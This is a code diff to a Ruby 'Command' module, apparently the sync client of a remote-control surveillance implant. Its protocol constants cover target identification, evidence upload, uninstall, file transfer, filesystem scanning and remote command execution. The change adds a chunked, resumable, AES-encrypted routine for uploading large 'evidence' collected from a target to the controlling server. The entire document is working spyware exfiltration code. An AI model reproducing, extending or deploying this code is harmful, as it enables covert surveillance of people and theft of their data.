@@ -22,21 +22,22 @@ module Command
   include Crypt
   include Tracer
   
-  INVALID_COMMAND     = 0x00       # Don't use
-  PROTO_OK            = 0x01       # OK
-  PROTO_NO            = 0x02       # Nothing available
-  PROTO_BYE           = 0x03       # The end of the protocol
-  PROTO_ID            = 0x0f       # Identification of the target
-  PROTO_CONF          = 0x07       # New configuration
-  PROTO_UNINSTALL     = 0x0a       # Uninstall command
-  PROTO_DOWNLOAD      = 0x0c       # List of files to be downloaded
-  PROTO_UPLOAD        = 0x0d       # A file to be saved
-  PROTO_UPGRADE       = 0x16       # Upgrade for the agent
-  PROTO_EVIDENCE      = 0x09       # Upload of an evidence
-  PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
-  PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
-  PROTO_PURGE         = 0x1a       # purge the log queue
-  PROTO_EXEC          = 0x1b       # execution of commands during sync
+  INVALID_COMMAND      = 0x00       # Don't use
+  PROTO_OK             = 0x01       # OK
+  PROTO_NO             = 0x02       # Nothing available
+  PROTO_BYE            = 0x03       # The end of the protocol
+  PROTO_ID             = 0x0f       # Identification of the target
+  PROTO_CONF           = 0x07       # New configuration
+  PROTO_UNINSTALL      = 0x0a       # Uninstall command
+  PROTO_DOWNLOAD       = 0x0c       # List of files to be downloaded
+  PROTO_UPLOAD         = 0x0d       # A file to be saved
+  PROTO_UPGRADE        = 0x16       # Upgrade for the agent
+  PROTO_EVIDENCE       = 0x09       # Upload of an evidence
+  PROTO_EVIDENCE_CHUNK = 0x10       # Upload of an evidence (in chunks)
+  PROTO_EVIDENCE_SIZE  = 0x0b       # Queue for evidence
+  PROTO_FILESYSTEM     = 0x19       # List of paths to be scanned
+  PROTO_PURGE          = 0x1a       # purge the log queue
+  PROTO_EXEC           = 0x1b       # execution of commands during sync
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
@@ -324,26 +325,71 @@ module Command
     
     # take the first log
     evidence = evidences.shift
-    
-    # prepare the message
-    message = [PROTO_EVIDENCE].pack('I') + [evidence.size].pack('I') + evidence.binary
-    enc_msg = aes_encrypt_integrity(message, @session_key)
-    # send the message and receive the response
-    resp = @transport.message enc_msg
 
-    # remove the random bytes at the end
-    resp = normalize(resp)
-
-    resp = aes_decrypt_integrity(resp, @session_key)
-
-    if resp.unpack('I') == [PROTO_OK] then
-      trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
+    # if the evidence is big, split in chunks
+    if evidence.size > 100_000
+      send_evidence_chunk(evidence)
     else
-      trace :info, "EVIDENCE -- problems from server"
+
+      # prepare the message
+      message = [PROTO_EVIDENCE].pack('I') + [evidence.size].pack('I') + evidence.binary
+      enc_msg = aes_encrypt_integrity(message, @session_key)
+      # send the message and receive the response
+      resp = @transport.message enc_msg
+
+      # remove the random bytes at the end
+      resp = normalize(resp)
+
+      resp = aes_decrypt_integrity(resp, @session_key)
+
+      if resp.unpack('I') == [PROTO_OK]
+        trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
+      else
+        trace :info, "EVIDENCE -- problems from server"
+        return
+      end
     end
 
     # recurse for the next log to be sent
     send_evidence evidences unless evidences.empty?
+  end
+
+  # Protocol Evidence (with resume in chunk)
+  # -> PROTO_EVIDENCE_CHUNK [ id, base, chunk, size, content ]
+  # <- PROTO_OK [ base ] | PROTO_NO
+  def send_evidence_chunk(evidence)
+
+    id = 0
+    base = 0
+    chunk = 50_000
+
+    binary = StringIO.open(evidence.binary, "rb")
+
+    while buff = binary.read(chunk)
+      chunk = buff.bytesize
+
+      # prepare the message
+      message = [PROTO_EVIDENCE_CHUNK].pack('I') +
+                [id].pack('I') + [base].pack('I') + [chunk].pack('I') + [evidence.size].pack('I') +
+                buff
+
+      # send the message and receive the response
+      enc_msg = aes_encrypt_integrity(message, @session_key)
+      resp = @transport.message enc_msg
+      # remove the random bytes at the end
+      resp = normalize(resp)
+      resp = aes_decrypt_integrity(resp, @session_key)
+
+      if resp.slice!(0..3).unpack('I') == [PROTO_OK]
+        trace :info, "EVIDENCE -- [#{evidence.name}] #{base}/#{chunk} bytes sent (total #{evidence.size})"
+        dummy, base = resp.unpack('I*')
+        trace :info, "EVIDENCE -- [#{evidence.name}] acknowledged base: #{base}"
+      else
+        trace :info, "EVIDENCE -- problems from server"
+        return
+      end
+    end
+
   end
 
   # Protocol Purge
